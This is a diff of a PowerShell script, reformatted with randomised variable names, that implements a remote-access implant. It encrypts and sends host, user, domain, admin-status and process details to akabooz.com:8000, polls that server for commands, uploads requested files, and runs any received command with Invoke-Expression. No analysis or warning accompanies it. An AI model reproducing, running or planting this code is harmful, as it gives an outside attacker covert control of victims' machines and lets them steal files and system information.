@@ -1,1 +1,156 @@
-$ZV = 5; $HPIR = "R0tKTU1FQU1VTkxRUVJGTEdTR0xOQkJNUEtVS0lIR1U="; $UCPJYLPMN = "WklITllQT1VMV1VCS0FEQQ==" function DS($HPIR, $UCPJYLPMN) { $ZLYIV = New-Object "System.Security.Cryptography.AesManaged" $ZLYIV.Mode = [System.Security.Cryptography.CipherMode]::CBC $ZLYIV.Padding = [System.Security.Cryptography.PaddingMode]::Zeros $ZLYIV.BlockSize = 128 $ZLYIV.KeySize = 256 if ($UCPJYLPMN) { if ($UCPJYLPMN.getType().Name -eq "String") { $ZLYIV.IV = [System.Convert]::FromBase64String($UCPJYLPMN) } else { $ZLYIV.IV = $UCPJYLPMN } } if ($HPIR) { if ($HPIR.getType().Name -eq "String") { $ZLYIV.Key = [System.Convert]::FromBase64String($HPIR) } else { $ZLYIV.Key = $HPIR } } $ZLYIV } function EUIZHVKR($HPIR, $UCPJYLPMN, $unencryptedString) { $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString) $ZLYIV = DS $HPIR $UCPJYLPMN $OPLFMKHP = $ZLYIV.CreateEncryptor() $encryptedData = $OPLFMKHP.TransformFinalBlock($bytes, 0, $bytes.Length); [System.Convert]::ToBase64String($encryptedData) } function XAYIRDAZ($HPIR, $UCPJYLPMN, $cipher) { $bytes = [System.Convert]::FromBase64String($cipher) $ZLYIV = DS $HPIR $UCPJYLPMN $decryptor = $ZLYIV.CreateDecryptor(); $UHKGDISG = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length); [System.Text.Encoding]::UTF8.GetString($UHKGDISG).Trim([char]0) } $progressPreference = 'silentlyContinue'; $wc = New-Object system.Net.WebClient; $wc2 = New-Object system.Net.WebClient; $wcr = New-Object system.Net.WebClient; $hostname = $env:COMPUTERNAME; $ACTBKCEFW = EUIZHVKR $HPIR $UCPJYLPMN $hostname $MIZFSF = -join ((65..90) | Get-Random -Count 5 | % {[char]$_}); $r2 = $MIZFSF; $TLPH = "$hostname-$r2"; $CNU = $env:USERNAME; $whmenc = EUIZHVKR $HPIR $UCPJYLPMN $CNU $DEINQH = (Get-WmiObject Win32_OperatingSystem).OSArchitecture $AMLYICF = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($DEINQH)"; $LXIVJZMWM = (Get-WmiObject Win32_ComputerSystem).Domain; $procarch = [Environment]::Is64BitProcess $procarchf = "" if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"} $pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf" $user_identity = [Security.Principal.WindowsIdentity]::GetCurrent(); $iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) if($iselv){ $CNU = $CNU + "*" } $raw_header = "$TLPH,$CNU,$AMLYICF,$pnid,$LXIVJZMWM"; $encrypted_header = EUIZHVKR $HPIR $UCPJYLPMN $raw_header; $final_hostname_encrypted = EUIZHVKR $HPIR $UCPJYLPMN $TLPH $wch = $wc.headers; $wch.add("Authorization", $encrypted_header); $wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"); $wc.downloadString("https://akabooz.com:8000/login"); $failure_counter = 0; while($true){ try{ $command_raw = $wc2.downloadString("https://akabooz.com:8000/view/$TLPH"); }catch{ $failure_counter=$failure_counter +1; if ($failure_counter -eq 10){ kill $pid } } $final_command = XAYIRDAZ $HPIR $UCPJYLPMN $command_raw $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21) if($fc -eq "False"){ } elseif($fc -eq "Report"){ $ps = foreach ($i in Get-Process){$i.ProcessName}; $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n"); $ps+= $arr -join ";" $ps+= (Get-WmiObject -Class win32_operatingSystem).version; $ps+= (Get-WinSystemLocale).Name $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)" $pst = EUIZHVKR $HPIR $UCPJYLPMN $ps $wcrh = $wcr.Headers; $wcrh.add("Authorization", $pst); $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"); $wcrh.add("App-Logic", $ACTBKCEFW); $wcr.downloadString("https://akabooz.com:8000/calls"); } elseif($fc.split(" ")[0] -eq "Download"){ $filename = EUIZHVKR $HPIR $UCPJYLPMN $fc.split("\")[-1] $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1]) $CFV = [Convert]::ToBase64String($file_content); $efc = EUIZHVKR $HPIR $UCPJYLPMN $CFV; $WMUG = new-object net.WebClient; $XL = $WMUG.Headers; $XL.add("Content-Type", "application/x-www-form-urlencoded"); $XL.add("x-Authorization", $whmenc); $WMUG.UploadString("https://akabooz.com:8000/messages", "fn=$filename&token=$efc"); } elseif($fc -eq "reset-ps"){ try{ # Reset Powershell session (clean) # NOT IMPLEMENTED YET $ec = "NO"; } catch{ $ec = $Error[0] | Out-String; } $CFV = EUIZHVKR $HPIR $UCPJYLPMN $ec; $WMUG = New-Object system.Net.WebClient; $WMUG.Headers["App-Logic"] = $final_hostname_encrypted; $WMUG.Headers["Authorization"] = $CFV; $WMUG.Headers["Session"] = $command_raw; $WMUG.downloadString("https://akabooz.com:8000/bills"); } else{ try{ $ec = Invoke-Expression ($fc) | Out-String; } catch{ $ec = $Error[0] | Out-String; } $CFV = EUIZHVKR $HPIR $UCPJYLPMN $ec; $WMUG = New-Object system.Net.WebClient; $WMUG.Headers["App-Logic"] = $final_hostname_encrypted; $WMUG.Headers["Authorization"] = $CFV; $WMUG.Headers["Session"] = $command_raw; $WMUG.downloadString("https://akabooz.com:8000/bills"); } sleep $ZV; } 
+$IMVU = 5;
+$VRVNHD = "R0tKTU1FQU1VTkxRUVJGTEdTR0xOQkJNUEtVS0lIR1U=";
+$WCKPP = "WklITllQT1VMV1VCS0FEQQ=="
+
+function LD($VRVNHD, $WCKPP) {
+    $EYALXD = New-Object "System.Security.Cryptography.AesManaged"
+    $EYALXD.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $EYALXD.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $EYALXD.BlockSize = 128
+    $EYALXD.KeySize = 256
+    if ($WCKPP) {
+        if ($WCKPP.getType().Name -eq "String") {
+            $EYALXD.IV = [System.Convert]::FromBase64String($WCKPP)
+        }
+        else {
+            $EYALXD.IV = $WCKPP
+        }
+    }
+    if ($VRVNHD) {
+        if ($VRVNHD.getType().Name -eq "String") {
+            $EYALXD.Key = [System.Convert]::FromBase64String($VRVNHD)
+        }
+        else {
+            $EYALXD.Key = $VRVNHD
+        }
+    }
+    $EYALXD
+}
+
+function QZQKFAVSW($VRVNHD, $WCKPP, $unencryptedString) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $EYALXD = LD $VRVNHD $WCKPP
+    $ARXDZNX = $EYALXD.CreateEncryptor()
+    $encryptedData = $ARXDZNX.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [System.Convert]::ToBase64String($encryptedData)
+}
+
+function YIZNDVR($VRVNHD, $WCKPP, $cipher) {
+    $bytes = [System.Convert]::FromBase64String($cipher)
+    $EYALXD = LD $VRVNHD $WCKPP
+    $decryptor = $EYALXD.CreateDecryptor();
+    $YMASA = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [System.Text.Encoding]::UTF8.GetString($YMASA).Trim([char]0)
+}
+
+
+$progressPreference = 'silentlyContinue';
+$wc = New-Object system.Net.WebClient;
+$wc2 = New-Object system.Net.WebClient;
+$wcr = New-Object system.Net.WebClient;
+$hostname = $env:COMPUTERNAME;
+$M = QZQKFAVSW $VRVNHD $WCKPP $hostname
+$VDXDLI = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
+$r2 = $VDXDLI;
+$B = "$hostname-$r2";
+$PTIVMBYA = $env:USERNAME;
+$whmenc = QZQKFAVSW $VRVNHD $WCKPP $PTIVMBYA
+$UOD = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+$O = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($UOD)";
+$RZZX = (Get-WmiObject Win32_ComputerSystem).Domain;
+
+
+$procarch = [Environment]::Is64BitProcess
+$procarchf = ""
+if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}
+
+$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"
+
+$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
+$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+
+if($iselv){
+$PTIVMBYA = $PTIVMBYA + "*"
+}
+
+$raw_header = "$B,$PTIVMBYA,$O,$pnid,$RZZX";
+$encrypted_header = QZQKFAVSW $VRVNHD $WCKPP $raw_header;
+$final_hostname_encrypted = QZQKFAVSW $VRVNHD $WCKPP $B
+
+$wch = $wc.headers;
+$wch.add("Authorization", $encrypted_header);
+$wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
+
+$wc.downloadString("https://akabooz.com:8000/login");
+$failure_counter = 0;
+while($true){
+
+    try{
+    $command_raw = $wc2.downloadString("https://akabooz.com:8000/view/$B");
+    }catch{
+    $failure_counter=$failure_counter +1;
+    if ($failure_counter -eq 10){
+    kill $pid
+    }
+    }
+
+    $final_command = YIZNDVR $VRVNHD $WCKPP $command_raw
+    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)
+
+    if($fc -eq "False"){
+
+    } elseif($fc -eq "Report"){
+      $ps = foreach ($i in Get-Process){$i.ProcessName};
+      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
+      $ps+= $arr -join ";"
+      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
+      $ps+= (Get-WinSystemLocale).Name
+      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
+      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
+      $pst = QZQKFAVSW $VRVNHD $WCKPP $ps
+      $wcrh = $wcr.Headers;
+      $wcrh.add("Authorization", $pst);
+      $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
+      $wcrh.add("App-Logic", $M);
+      $wcr.downloadString("https://akabooz.com:8000/calls");
+    } elseif($fc.split(" ")[0] -eq "Download"){
+        $filename = QZQKFAVSW $VRVNHD $WCKPP $fc.split("\")[-1]
+        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
+        $XM = [Convert]::ToBase64String($file_content);
+        $efc = QZQKFAVSW $VRVNHD $WCKPP $XM;
+        $GGWLZZEKG = new-object net.WebClient;
+        $KEKD = $GGWLZZEKG.Headers;
+        $KEKD.add("Content-Type", "application/x-www-form-urlencoded");
+        $KEKD.add("x-Authorization", $whmenc);
+        $GGWLZZEKG.UploadString("https://akabooz.com:8000/messages", "fn=$filename&token=$efc");
+    } elseif($fc -eq "reset-ps"){
+        try{
+        $ec = "NO";
+        }
+        catch{
+        $ec = $Error[0] | Out-String;
+        }
+
+        $XM = QZQKFAVSW $VRVNHD $WCKPP $ec;
+        $GGWLZZEKG = New-Object system.Net.WebClient;
+        $GGWLZZEKG.Headers["App-Logic"] = $final_hostname_encrypted;
+        $GGWLZZEKG.Headers["Authorization"] = $XM;
+        $GGWLZZEKG.Headers["Session"] = $command_raw;
+        $GGWLZZEKG.downloadString("https://akabooz.com:8000/bills");
+    } else{
+      try{
+        $ec = Invoke-Expression ($fc) | Out-String;
+        }
+        catch{
+        $ec = $Error[0] | Out-String;
+        }
+        $XM = QZQKFAVSW $VRVNHD $WCKPP $ec;
+        $GGWLZZEKG = New-Object system.Net.WebClient;
+        $GGWLZZEKG.Headers["App-Logic"] = $final_hostname_encrypted;
+        $GGWLZZEKG.Headers["Authorization"] = $XM;
+        $GGWLZZEKG.Headers["Session"] = $command_raw;
+        $GGWLZZEKG.downloadString("https://akabooz.com:8000/bills");
+    }
+
+    sleep $IMVU;
+    }
